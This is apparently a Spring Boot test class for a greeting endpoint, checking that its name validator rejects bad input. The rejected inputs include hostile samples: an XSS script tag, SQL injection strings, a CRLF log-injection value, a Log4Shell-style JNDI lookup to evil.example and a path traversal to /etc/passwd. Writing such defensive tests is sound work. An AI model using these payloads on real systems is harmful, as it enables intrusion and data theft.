package io.github.np03042021.spr.hello;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.assertj.MockMvcTester;

@SpringBootTest(properties = "app.greeting.prefix=Hi there")
@AutoConfigureMockMvc
class HelloApiTest {

    @Autowired
    MockMvcTester mvc;

    @Test
    void defaultsToWorldWhenNameIsMissing() {
        assertThat(mvc.get().uri("/api/hello"))
                .hasStatusOk()
                .hasContentTypeCompatibleWith(MediaType.APPLICATION_JSON)
                .bodyJson().extractingPath("$.message").isEqualTo("Hi there, World");
    }

    @Test
    void greetsWithPrefixFromConfiguration() {
        assertThat(mvc.get().uri("/api/hello").param("name", "Alice"))
                .hasStatusOk()
                .bodyJson().extractingPath("$.message").isEqualTo("Hi there, Alice");
    }

    @ParameterizedTest
    @ValueSource(strings = {"Mary-Jane O'Neil", "Jean Luc", "A"})
    void acceptsAllowListedNames(String name) {
        assertThat(mvc.get().uri("/api/hello").param("name", name))
                .hasStatusOk()
                .bodyJson().extractingPath("$.message").isEqualTo("Hi there, " + name);
    }

    @Test
    void acceptsNameAtMaximumLength() {
        assertThat(mvc.get().uri("/api/hello").param("name", "a".repeat(HelloController.NAME_MAX_LENGTH)))
                .hasStatusOk();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            " Alice",                            // leading separator
            "Anna  Lee",                         // double space
            "Alice-",                            // trailing separator
            "<script>alert(1)</script>",         // reflected XSS
            "' OR 1=1--",                        // SQL injection shape
            "Robert'); DROP TABLE users;--",     // classic injection
            "Alice\r\nINFO forged log line",     // CRLF / log injection
            "${jndi:ldap://evil.example/a}",     // Log4Shell-style lookup
            "../../etc/passwd",                  // path traversal shape
            "Alice123",                          // digits are not names
            "José",                              // non-ASCII (DEMO ONLY limitation, see HelloController)
    })
    void rejectsInputOutsideTheAllowList(String name) {
        assertThat(mvc.get().uri("/api/hello").param("name", name))
                .hasStatus(HttpStatus.BAD_REQUEST)
                .hasContentTypeCompatibleWith(MediaType.APPLICATION_PROBLEM_JSON)
                .bodyText().doesNotContain(name);
    }

    // Spring applies @RequestParam's defaultValue to an empty value as well as a missing one,
    // so "?name=" falls back to the fixed, safe default instead of reaching the validator.
    @Test
    void emptyNameFallsBackToDefault() {
        assertThat(mvc.get().uri("/api/hello").param("name", ""))
                .hasStatusOk()
                .bodyJson().extractingPath("$.message").isEqualTo("Hi there, World");
    }

    @Test
    void rejectsNameOverMaximumLength() {
        assertThat(mvc.get().uri("/api/hello").param("name", "a".repeat(HelloController.NAME_MAX_LENGTH + 1)))
                .hasStatus(HttpStatus.BAD_REQUEST);
    }

    @Test
    void validationErrorIsGenericAndLeaksNoInternals() {
        assertThat(mvc.get().uri("/api/hello").param("name", "<b>x</b>"))
                .hasStatus(HttpStatus.BAD_REQUEST)
                .bodyJson()
                .extractingPath("$.detail").asString()
                .startsWith("name must be 1-40 ASCII letters")
                .doesNotContain("Exception", "jakarta", "<b>");
    }
}
